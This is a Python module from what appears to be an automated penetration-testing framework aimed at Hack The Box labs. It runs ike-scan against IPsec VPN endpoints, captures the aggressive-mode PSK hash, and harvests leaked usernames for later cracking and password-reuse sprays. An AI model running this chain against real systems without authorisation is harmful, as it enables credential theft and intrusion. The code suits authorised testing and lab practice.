"""
IKE / IPsec (ISAKMP) enumeration — the recon half of the IKE aggressive-mode chain.

When UDP/500 (ISAKMP) is open, this:
  1. Fingerprints the responder with `ike-scan -M` (transforms + vendor IDs).
  2. Probes IKEv1 **aggressive mode** with `ike-scan -A --pskcrack=<file>`.

Aggressive mode is itself a finding (the responder hands back its identity and a
PSK hash before authenticating). Two facts are mined from the aggressive reply:

  * the disclosed **ID payload** → a username/hostname (and domain) fact, e.g.
    `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)` → user `ike`, domain
    `expressway.htb`;
  * the captured **PSK hash** (the ike-scan `--pskcrack` parameter file) → recorded
    as an uncracked hash so `crack.hashes` feeds it to `psk-crack` (see lib/crack.py).

Recon only — once the PSK is cracked, the cross-protocol reuse spray tests it as a
password (Expressway reused the PSK verbatim as the SSH password). No tunnels are
established, no exploitation here.
"""
from __future__ import annotations

import re

from lib.runner import Runner

# The ike-scan --pskcrack parameter file (one entry per aggressive handshake).
# Lives in loot/ so crack.hashes can find and feed it to psk-crack.
PSK_FILE = "ike_psk.txt"

# ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
_ID_RE = re.compile(r"ID\(Type=(\w+),\s*Value=([^)]+)\)")
# SA=( ... Auth=PSK ... )
_SA_RE = re.compile(r"SA=\(([^)]*)\)")


def _facts(runner: Runner):
    """The wired FactStore (runner.ws), or None in a legacy/test path."""
    return getattr(runner, "ws", None)


def _ingest_id(facts, id_type: str, value: str, findings) -> dict:
    """Turn a disclosed ID payload into user/hostname/domain facts.

    ID_USER_FQDN `user@domain`  → user + domain
    ID_FQDN `host.domain`       → hostname + domain (host.domain's parent)
    other (ID_IPV4_ADDR, …)     → reported, no fact mined
    """
    value = value.strip()
    out = {"type": id_type, "value": value, "user": "", "domain": "", "hostname": ""}
    findings.bullet(f"**Disclosed ID payload:** `{id_type}` = `{value}` "
                    "(aggressive-mode identity leak)")
    findings.add_summary(f"IKE aggressive mode leaks ID `{value}`")

    if id_type == "ID_USER_FQDN" and "@" in value:
        user, _, domain = value.partition("@")
        out["user"], out["domain"] = user.strip(), domain.strip()
        if facts is not None:
            if out["user"]:
                facts.add_user(out["user"], authoritative=True)
                findings.bullet(f"→ user fact: `{out['user']}`")
            if out["domain"]:
                facts.set_discovered_domain(out["domain"])
                facts.add_hostname(out["domain"])
                findings.bullet(f"→ domain fact: `{out['domain']}`")
    elif id_type == "ID_FQDN":
        out["hostname"] = value
        if facts is not None and value:
            facts.add_hostname(value)
            if "." in value:
                parent = value.split(".", 1)[1]
                out["domain"] = parent
                facts.set_discovered_domain(parent)
            findings.bullet(f"→ hostname fact: `{value}`")
    return out


def enumerate_ike(ip: str, runner: Runner, findings, available: set[str]) -> dict:
    """Fingerprint ISAKMP on `ip` and probe aggressive mode. Pushes user/domain/
    hostname + PSK-hash facts into the fact store (via runner.ws). Returns a
    structured summary dict (used by tests and the action result)."""
    facts = _facts(runner)
    result = {"main_mode": False, "aggressive": False, "psk_auth": False,
              "id": None, "psk_captured": False}

    if "ike-scan" not in available:
        findings.note("ike-scan not installed — cannot enumerate ISAKMP (apt install ike-scan)")
        return result

    findings.h4("IKE / IPsec (ISAKMP, udp/500)")

    # ── 1. Main-mode fingerprint (transforms + vendor IDs) ─────────────────────
    cmd = ["ike-scan", "-M", ip]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, "ike_main_fingerprint", timeout=60)
    if "Main Mode Handshake returned" in out:
        result["main_mode"] = True
        findings.bullet("Responder answered **main mode** handshake")
        sa = _SA_RE.search(out)
        if sa:
            findings.bullet(f"Transform: `{sa.group(1).strip()}`")
            if "Auth=PSK" in sa.group(0):
                result["psk_auth"] = True
        for vid in re.findall(r"VID=[0-9a-f]+\s*\(([^)]+)\)", out):
            findings.bullet(f"Vendor ID: `{vid}`")

    # ── 2. Aggressive-mode probe (--pskcrack captures the PSK hash) ─────────────
    psk_path = None
    if facts is not None:
        psk_path = facts.loot_dir / PSK_FILE
    cmd2 = ["ike-scan", "-A", ip]
    if psk_path is not None:
        cmd2 = ["ike-scan", "-A", f"--pskcrack={psk_path}", ip]
    findings.cmd(" ".join(cmd2))
    out2 = runner.run(cmd2, "ike_aggressive", timeout=60)

    if "Aggressive Mode Handshake returned" in out2:
        result["aggressive"] = True
        findings.bullet("**IKEv1 AGGRESSIVE MODE enabled** — responder discloses its "
                        "identity + a crackable PSK hash before authenticating")
        findings.add_summary("**IKE aggressive mode enabled** (udp/500) — PSK offline-crackable")
        sa = _SA_RE.search(out2)
        if sa and "Auth=PSK" in sa.group(0):
            result["psk_auth"] = True

        m = _ID_RE.search(out2)
        if m:
            result["id"] = _ingest_id(facts, m.group(1), m.group(2), findings)

        if psk_path is not None and psk_path.exists() and psk_path.stat().st_size > 0:
            result["psk_captured"] = True
            principal = (result["id"] or {}).get("user", "") if result["id"] else ""
            if facts is not None:
                # Record as an uncracked hash so crack.hashes (psk-crack backend)
                # picks it up. Principal = the leaked ID user when known, so the
                # cracked PSK becomes a targeted (user, pass) pair for reuse.
                facts.add_hash("ikepsk", principal)
            findings.bullet(f"**PSK hash captured → `loot/{PSK_FILE}`** — crack with "
                            "`crack.hashes` (psk-crack + rockyou)")
            findings.add_summary(f"IKE PSK hash captured in `loot/{PSK_FILE}` — run crack.hashes")
    elif result["main_mode"]:
        findings.bullet("Aggressive mode not offered (main mode only) — no PSK leak")

    return result
